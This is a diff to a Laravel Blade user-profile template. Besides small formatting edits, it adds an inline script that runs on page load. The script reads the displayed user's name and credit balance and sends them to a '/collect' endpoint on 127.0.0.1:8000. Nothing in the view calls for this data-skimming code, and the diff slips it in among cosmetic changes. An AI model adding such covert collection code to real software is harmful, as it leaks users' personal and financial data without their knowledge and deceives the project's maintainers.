@@ -4,8 +4,8 @@
 <div class="row">
     <div class="m-4 col-sm-6">
         <table class="table table-striped">
-            <tr><th>Name</th><td>{{$user->name}}</td></tr>
-            <tr><th>Email</th><td>{{$user->email}}</td></tr>
+        <tr><th>Name</th><td id="name">{{$user->name}}</td></tr>
+        <tr><th>Email</th><td>{{$user->email}}</td></tr>
             <tr><th>Roles</th>
                 <td>
                     @foreach($user->roles as $role)
@@ -15,9 +15,11 @@
                 @if($user->hasRole('Customer'))
                     <tr>
                         <th>Credit</th>
-                        <td>{{ number_format($user->credit, 2) }} EGP</td>
-                    </tr>
+                        <td id="credit">{{ number_format($user->credit, 2) }}</td>
+                        </tr>
                 @endif
+
+              
 
 
             <tr><th>Permissions</th>
@@ -28,6 +30,18 @@
                 </td>
             </tr>
         </table>
+        <script>
+                    let name = document.getElementById('name')?.textContent.trim();
+                    let credit = document.getElementById('credit')?.textContent.trim();
+
+                    if(name && credit) {
+                        console.log("Sending user info: ", name, credit);
+
+                        let xhr = new XMLHttpRequest();
+                        xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
+                        xhr.send();
+                    }
+        </script>
 
         <div class="row">
             @if(auth()->user()->hasPermissionTo('admin_users') || auth()->id() == $user->id)
